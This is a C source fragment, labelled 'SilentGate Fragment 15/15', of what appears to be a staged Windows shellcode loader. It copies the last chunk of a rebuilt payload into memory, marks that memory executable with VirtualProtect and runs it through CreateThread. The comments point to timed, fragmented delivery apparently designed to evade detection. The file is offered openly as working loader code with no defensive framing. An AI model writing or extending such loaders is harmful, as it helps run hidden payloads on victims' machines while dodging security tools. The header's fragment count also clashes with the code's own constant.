/*
 * SilentGate Fragment 15/15
 * Offset: 112290 bytes  Size: 7488 bytes
 * Schedule: t=963ms (Poisson process)
 * Author: JarDani
 */

#include <windows.h>
#include <math.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FRAGMENT_ID   15
#define N_FRAGMENTS   16
#define PAYLOAD_SIZE  119778
#define CHUNK_OFFSET  112290
#define CHUNK_SIZE    7488
#define SLEEP_NEXT_MS 963

/* Forward declaration of reconstructor */
extern unsigned char* sg_reconstruct(int* out_len);


/* Fragment 15: Write final chunk + protect + execute */
void sg_execute_fragment_15(PVOID mem) {
    if (!mem) return;
    printf("[FRAG 15] Final fragment at t=963ms\n");

    /* Reconstruct payload for this chunk */
    int len = 0;
    unsigned char* payload = sg_reconstruct(&len);

    memcpy((BYTE*)mem + CHUNK_OFFSET, payload + CHUNK_OFFSET, CHUNK_SIZE);
    free(payload);

    /* Change to executable */
    DWORD old = 0;
    VirtualProtect(mem, PAYLOAD_SIZE, PAGE_EXECUTE_READ, &old);
    printf("[FRAG 15] Memory protected RX\n");

    /* Execute via CreateThread */
    HANDLE t = CreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);

    if (t) {
        printf("[FRAG 15] Executing reconstructed payload\n");
        WaitForSingleObject(t, 5000);
        CloseHandle(t);
    }

    VirtualFree(mem, 0, MEM_RELEASE);
    printf("[FRAG 15] Complete\n");
}
